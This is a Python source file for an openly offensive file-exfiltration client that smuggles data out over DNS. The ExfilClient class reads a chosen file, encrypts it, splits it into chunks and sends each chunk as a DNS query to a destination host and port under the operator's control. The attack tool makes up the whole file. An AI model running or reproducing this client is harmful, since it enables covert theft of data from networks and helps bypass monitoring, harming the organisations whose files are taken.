import binascii
import dns.name
import dns.message
import dns.query
import dns.flags
import dns.resolver
import time
import os.path
import base64
from crypto import AES256


class ExfilClient:
    def __init__(self, args):
        self.dest = args.dest
        self.port = args.port
        self.delay = float(args.delay)
        self.file = args.file
        self.packet_size = args.packetsize
        self.ADDITIONAL_RDCLASS = 65535
        self.password = args.password

    def run(self):
        # check if file exists
        if not os.path.exists(self.file):
            print(f"File '{self.file}' does not exist. Aborting")
            return

        # get file name
        filename = os.path.basename(self.file)
        filenamebase64 = base64.b64encode(filename.encode("utf-8")).decode("utf-8")

        # read file to buffer
        buffer = bytearray()
        with open(self.file, "rb") as f:
            buffer = f.read()
            if len(buffer) == 0:
                print(f"File '{self.file}' is empty. Aborting")
                return

        print(f"Read {len(buffer)} bytes from {self.file}")

        # encrypt entire file buffer
        aes = AES256(self.password)
        contents_encrypted = aes.encrypt_bytes(buffer)
        contents_length = len(contents_encrypted)

        # split buffer into packets of self.packet_size
        num_packets = int(contents_length / self.packet_size)
        if contents_length % self.packet_size != 0:
            num_packets += 1

        packets = []
        for n in range(0, num_packets):
            contents_start = n * self.packet_size
            contents_end = contents_start + self.packet_size
            if contents_end >= contents_length:
                contents_end = contents_length
            packet = contents_encrypted[contents_start:contents_end]
            packets.append(packet)

        print(f"Prepared {len(packets)} packets of {self.packet_size} bytes for exfiltration")

        # send each packet as a dns query to dest:port
        self.send_packet(f"BEGIN={filenamebase64}")
        c = 1
        for p in packets:
            domain = p.decode("utf-8") + ""
            self.send_packet(domain)
            print(f"[{c}/{num_packets}]: sent {domain}")
            time.sleep(self.delay)
            c += 1
        self.send_packet("---END---")

        print()
        print(f"Done! Sent {self.file} in {len(packets)} DNS queries")

    def send_packet(self, domain):
        try:
            # print(f"Sending packet: {domain}...")
            domain = dns.name.from_text(domain)

            if not domain.is_absolute():
                domain = domain.concatenate(dns.name.root)

            request = dns.message.make_query(domain, dns.rdatatype.A)
            request.flags |= dns.flags.AD
            request.find_rrset(request.additional, dns.name.root, self.ADDITIONAL_RDCLASS, dns.rdatatype.OPT, create=True, force_unique=True)
            response = dns.query.udp(request, self.dest, port=self.port, timeout=1, ignore_trailing=True, ignore_unexpected=False)

            # print(response.answer)
            # print(response.additional)
            # print(response.authority)

        # as of now the ExfilHost sends back a malformed DNS packet. I have yet to fix this. Feel free to contribute.
        # therefore, getting a BadLabelType exception as a response is considered to be a valid response (I know...)
        except dns.name.BadLabelType as e:
            print("Success:", domain)

        except dns.name.LabelTooLong:
            print("ERROR: DNS label too long! Unable to exfiltrate data. Aborting")
            return

        # this shouldn't happen, but hey
        except Exception as ex:
            pass
            # print(type(ex))
            print("General exception:", ex)

